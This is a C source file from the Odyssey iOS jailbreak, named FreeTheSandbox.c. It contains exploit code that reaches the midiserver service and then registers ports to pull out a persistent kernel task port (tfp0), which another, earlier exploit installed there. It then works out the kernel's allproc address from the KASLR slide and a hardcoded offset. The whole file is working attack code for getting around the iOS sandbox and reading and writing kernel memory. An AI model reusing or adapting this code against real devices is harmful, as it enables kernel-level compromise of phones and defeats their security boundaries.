//
//  FreeTheSandbox.c
//  Odyssey
//
//  Created by master on 2021/2/7.
//  Copyright © 2021 coolstar. All rights reserved.
//

#include "FreeTheSandbox.h"
#include <mach/mach.h>
#include <unistd.h>
 

mach_port_t retrieve_tfp0()
{
    mach_port_t tfp0_port=MACH_PORT_NULL;
    
    // Activate tfp0-persis program
    mach_port_t midi_bsport = 0;
    extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
    bootstrap_look_up(bootstrap_port, "com.apple.midiserver", &midi_bsport);
    if(!midi_bsport){
        //printf("run_exploit_or_achieve_tf0 failed: bootstrap_look_up has problem\n");
        return MACH_PORT_NULL;
    }
    
    mach_port_t stored_ports[3] = {0};
    stored_ports[0] = mach_task_self();
    stored_ports[2] = midi_bsport;
    mach_ports_register(mach_task_self(), stored_ports, 3);
    // Waiting for installation
    sleep(2);
    
    tfp0_port = 0;
    task_get_special_port(mach_task_self(), TASK_ACCESS_PORT, &tfp0_port);
    
    stored_ports[2] = 0;
    mach_ports_register(mach_task_self(), stored_ports, 3);
    
    printf("tfp0: 0x%x\n", tfp0_port);
    
    return tfp0_port;
}

uint64_t getallproc(mach_port_t tfp0)
{
    uint64_t kaslr=0;
    
    uint64_t HARDCODED_allproc = 0xFFFFFFF0092544B0;
    
    extern kern_return_t pid_for_task(mach_port_name_t t, int *x);
    pid_for_task(tfp0, (int*)&kaslr);
    printf("kaslr: 0x%x\n", (uint32_t)kaslr);
    
    
    return kaslr+HARDCODED_allproc;
}
